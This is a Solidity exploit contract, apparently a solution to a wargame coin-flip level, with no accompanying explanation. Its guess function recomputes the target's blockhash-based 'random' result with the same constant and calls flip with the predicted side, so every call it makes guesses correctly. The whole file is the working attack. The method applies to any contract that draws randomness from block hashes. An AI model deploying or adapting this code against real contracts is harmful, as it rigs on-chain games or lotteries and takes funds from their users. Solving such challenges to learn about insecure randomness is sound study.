// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0;

contract CoinFlipGuesser {
    uint256 public lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function guess(address target) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) revert();
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        ICoinFlip(target).flip(side);
    }

    function getHash() public view returns(uint256){
        return uint256(blockhash(block.number - 1));
    }
}

interface ICoinFlip {
    function flip(bool _guess) external;
}